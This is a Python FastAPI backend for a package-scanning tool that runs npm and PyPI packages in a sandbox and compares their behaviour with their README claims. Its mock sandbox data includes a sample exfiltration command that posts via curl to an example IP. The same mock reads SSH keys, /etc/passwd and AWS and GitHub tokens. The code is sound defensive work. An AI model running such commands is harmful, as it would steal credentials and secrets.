# backend/main.py
import os, asyncio, shutil
from pathlib import Path
from fastapi import FastAPI, Header, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from shared.schemas import (
    ScanRequest, LocalScanRequest, PhaseTrace, BehavioralFingerprint, ClaimedIntent, ScanVerdict
)
from backend.db import supabase
from backend.registry import fetch_package_info

app = FastAPI(title="PkgGuard Orchestrator API")

allowed_origins = [
    origin.strip()
    for origin in os.getenv(
        "CORS_ORIGINS",
        "http://localhost:3000,http://127.0.0.1:3000",
    ).split(",")
    if origin.strip()
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=allowed_origins,
    allow_methods=["*"],
    allow_headers=["*"],
)

async def require_authenticated_user(authorization: str | None) -> None:
    if os.getenv("REQUIRE_AUTH", "false").lower() != "true":
        return
    if supabase is None:
        raise HTTPException(
            status_code=503,
            detail="Supabase authentication is not configured.",
        )
    if not authorization or not authorization.lower().startswith("bearer "):
        raise HTTPException(status_code=401, detail="A Supabase access token is required.")
    token = authorization.split(" ", 1)[1].strip()
    try:
        user = supabase.auth.get_user(token)
    except Exception as error:
        raise HTTPException(status_code=401, detail="Supabase access token is invalid.") from error
    if not user or not user.user:
        raise HTTPException(status_code=401, detail="Supabase access token is invalid.")

# --- SMART INTEGRATION ADAPTERS (Calls Member 1 & 2, or falls back to Mock) ---
async def run_member1_sandbox(ecosystem: str, target: str) -> BehavioralFingerprint:
    if os.getenv("USE_MOCK_MODULES", "true").lower() == "false":
        from sandbox.runner import run_sandbox

        result = await asyncio.to_thread(run_sandbox, ecosystem, target)
        return BehavioralFingerprint.model_validate(
            result["behavioral_fingerprint"]
        )

    # Mock fallback for standalone testing
    await asyncio.sleep(2.5)  # Simulate Docker spin-up
    if "evil" in target or "malicious" in target:
        return BehavioralFingerprint(
            install_time=PhaseTrace(
                network_calls=["198.51.100.42:443"],
                files_touched=["/root/.ssh/id_rsa", "/etc/passwd"],
                env_vars_read=["AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN"],
                subprocesses_spawned=["/bin/sh -c curl -X POST https://198.51.100.42/exfil"]
            ),
            import_time=PhaseTrace()
        )
    return BehavioralFingerprint()

async def run_member2_intent(readme: str, metadata: dict) -> ClaimedIntent:
    if os.getenv("USE_MOCK_MODULES", "true").lower() == "false":
        from ai_engine.analyzer import extract_claimed_intent
        detected = await asyncio.to_thread(extract_claimed_intent, readme, metadata)
        return ClaimedIntent(
            summary=detected.summary,
            expects_network=detected.expects_network,
            expects_file_read_outside_pkg=detected.expects_file_read_outside_pkg,
            expects_subprocess=detected.expects_subprocess,
            expects_env_reads=detected.expects_env_reads,
        )

    await asyncio.sleep(1.0)
    return ClaimedIntent(
        summary=metadata.get("summary") or "Lightweight string manipulation utility.",
        expects_network=False,
        expects_file_read_outside_pkg=False,
        expects_subprocess=False,
        expects_env_reads=[]
    )

async def run_member2_verdict(claimed: ClaimedIntent, actual: BehavioralFingerprint) -> ScanVerdict:
    if os.getenv("USE_MOCK_MODULES", "true").lower() == "false":
        from ai_engine.analyzer import (
            BehavioralFingerprint as AnalyzerFingerprint,
            ClaimedIntent as AnalyzerIntent,
            evaluate_mismatch,
        )

        analyzer_claimed = AnalyzerIntent(
            summary=claimed.summary,
            expects_network=claimed.expects_network,
            expects_file_read_outside_pkg=claimed.expects_file_read_outside_pkg,
            expects_subprocess=claimed.expects_subprocess,
            expects_env_reads=claimed.expects_env_reads,
        )
        analyzer_actual = AnalyzerFingerprint.model_validate(actual.model_dump())
        detected = await asyncio.to_thread(
            evaluate_mismatch, analyzer_claimed, analyzer_actual
        )
        verdict = (
            "safe"
            if detected.severity == "low"
            else "suspicious"
            if detected.severity == "medium"
            else "malicious"
        )
        return ScanVerdict(
            risk_score=detected.risk_score,
            verdict=verdict,
            mismatch_flags=detected.findings,
            llm_explanation=detected.explanation,
        )

    await asyncio.sleep(1.2)
    if actual.install_time.network_calls or actual.install_time.files_touched:
        return ScanVerdict(
            risk_score=98,
            verdict="malicious",
            mismatch_flags=[
                f"CRITICAL: Claimed no network, but contacted {actual.install_time.network_calls} at install time.",
                f"CRITICAL: Accessed sensitive files {actual.install_time.files_touched}.",
                f"HIGH: Read undeclared secrets from environment: {actual.install_time.env_vars_read}."
            ],
            llm_explanation="The README claims this is a simple string utility with zero external dependencies, but during installation it read SSH private keys, harvested AWS/GitHub environment tokens, and spawned a shell to exfiltrate data to 198.51.100.42."
        )
    return ScanVerdict(
        risk_score=0,
        verdict="safe",
        mismatch_flags=[],
        llm_explanation="Observed install and import behavior matches the package's documented capabilities with zero unexpected network, file, or environment access."
    )

# --- CORE ORCHESTRATION ENDPOINT ---
@app.post("/api/scan")
async def scan_package(req: ScanRequest):
    if supabase is None:
        raise HTTPException(
            status_code=503,
            detail="Supabase persistence is not configured for registry scans.",
        )
    try:
        pkg_info = await fetch_package_info(req.ecosystem, req.name, req.version)
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Failed to fetch package metadata: {e}")

    # 1. Check Supabase Cache (unless force_rescan=True)
    if not req.force_rescan:
        existing_pkg = supabase.table("packages").select("*").eq("sha256_hash", pkg_info["sha256"]).execute()
        if existing_pkg.data:
            pkg_id = existing_pkg.data[0]["id"]
            cached_scan = supabase.table("behavioral_scans").select("*").eq("package_id", pkg_id).eq("status", "completed").execute()
            if cached_scan.data:
                scan = cached_scan.data[0]
                return {
                    "cached": True,
                    "scan_id": scan["id"],
                    "package": pkg_info["name"],
                    "version": pkg_info["version"],
                    "claimed_intent": existing_pkg.data[0]["claimed_intent"],
                    "behavioral_fingerprint": {
                        "install_time": scan["install_trace"],
                        "import_time": scan["import_trace"]
                    },
                    "verdict": {
                        "risk_score": scan["risk_score"],
                        "verdict": scan["verdict"],
                        "mismatch_flags": scan["mismatch_flags"],
                        "llm_explanation": scan["llm_explanation"]
                    }
                }

    # 2. Upsert Package Record
    pkg_res = supabase.table("packages").upsert({
        "ecosystem": req.ecosystem,
        "name": pkg_info["name"],
        "version": pkg_info["version"],
        "sha256_hash": pkg_info["sha256"],
        "readme_text": pkg_info["readme"][:5000]
    }, on_conflict="sha256_hash").execute()
    pkg_id = pkg_res.data[0]["id"]

    # 3. Create Scan Row in 'sandboxing' state (Member 4's UI immediately lights up!)
    scan_res = supabase.table("behavioral_scans").insert({
        "package_id": pkg_id,
        "package_name": pkg_info["name"],
        "ecosystem": req.ecosystem,
        "status": "sandboxing"
    }).execute()
    scan_id = scan_res.data[0]["id"]

    # 4. Run Member 1 (Sandbox) and Member 2 (README Extractor) concurrently
    claimed, fingerprint = await asyncio.gather(
        run_member2_intent(pkg_info["readme"], pkg_info["metadata"]),
        run_member1_sandbox(req.ecosystem, req.name)
    )

    # 5. Push intermediate traces to Supabase ('analyzing' state)
    supabase.table("packages").update({"claimed_intent": claimed.model_dump()}).eq("id", pkg_id).execute()
    supabase.table("behavioral_scans").update({
        "status": "analyzing",
        "install_trace": fingerprint.install_time.model_dump(),
        "import_trace": fingerprint.import_time.model_dump()
    }).eq("id", scan_id).execute()

    # 6. Run Member 2's Mismatch Judge
    verdict = await run_member2_verdict(claimed, fingerprint)

    # 7. Finalize Supabase Record ('completed' state)
    supabase.table("behavioral_scans").update({
        "status": "completed",
        "risk_score": verdict.risk_score,
        "verdict": verdict.verdict,
        "mismatch_flags": verdict.mismatch_flags,
        "llm_explanation": verdict.llm_explanation
    }).eq("id", scan_id).execute()

    return {
        "cached": False,
        "scan_id": scan_id,
        "package": pkg_info["name"],
        "version": pkg_info["version"],
        "claimed_intent": claimed.model_dump(),
        "behavioral_fingerprint": fingerprint.model_dump(),
        "verdict": verdict.model_dump()
    }


@app.get("/api/scan/{scan_id}")
async def get_scan(scan_id: str):
    """Return a persisted scan in the same shape as the scan request response."""
    if supabase is None:
        raise HTTPException(
            status_code=503,
            detail="Supabase persistence is not configured for persisted scans.",
        )
    scan_res = (
        supabase.table("behavioral_scans")
        .select("*")
        .eq("id", scan_id)
        .maybe_single()
        .execute()
    )
    if not scan_res.data:
        raise HTTPException(status_code=404, detail="Scan not found")

    scan = scan_res.data
    package_res = (
        supabase.table("packages")
        .select("name, version, claimed_intent")
        .eq("id", scan["package_id"])
        .maybe_single()
        .execute()
    )
    package = package_res.data or {}

    return {
        "cached": True,
        "scan_id": scan["id"],
        "package": scan.get("package_name") or package.get("name"),
        "version": package.get("version"),
        "status": scan.get("status"),
        "claimed_intent": package.get("claimed_intent") or {},
        "behavioral_fingerprint": {
            "install_time": scan.get("install_trace") or {},
            "import_time": scan.get("import_trace") or {},
        },
        "verdict": {
            "risk_score": scan.get("risk_score") or 0,
            "verdict": scan.get("verdict") or "safe",
            "mismatch_flags": scan.get("mismatch_flags") or [],
            "llm_explanation": scan.get("llm_explanation") or "",
        },
    }


@app.post("/api/local-scan")
async def scan_local_package(
    req: LocalScanRequest,
    authorization: str | None = Header(default=None),
):
    """Execute pasted package code in the Docker sandbox and return its verdict."""
    await require_authenticated_user(authorization)
    ecosystem = req.ecosystem.lower()
    if ecosystem not in {"pypi", "npm"}:
        raise HTTPException(status_code=400, detail="ecosystem must be pypi or npm")

    try:
        from backend.local_scan import build_local_archive
        from sandbox.runner import run_sandbox

        archive, import_name = build_local_archive(
            ecosystem, req.name, req.source, req.readme
        )
        result = await asyncio.to_thread(
            run_sandbox, ecosystem, req.name, archive
        )
        claimed = await run_member2_intent(req.readme, {"name": req.name})
        fingerprint = BehavioralFingerprint.model_validate(
            result["behavioral_fingerprint"]
        )
        verdict = await run_member2_verdict(claimed, fingerprint)
        return {
            "scan_id": result["package"]["sha256"],
            "package": req.name,
            "version": result["package"]["version"],
            "import_name": import_name,
            "status": "completed",
            "claimed_intent": claimed.model_dump(),
            "behavioral_fingerprint": fingerprint.model_dump(),
            "verdict": verdict.model_dump(),
            "sandbox_metadata": result.get("sandbox_metadata", {}),
        }
    except (FileNotFoundError, RuntimeError, ValueError) as error:
        raise HTTPException(status_code=422, detail=str(error)) from error
    except Exception as error:
        raise HTTPException(status_code=500, detail="Sandbox execution failed.") from error
    finally:
        if "archive" in locals():
            shutil.rmtree(Path(archive).parent, ignore_errors=True)
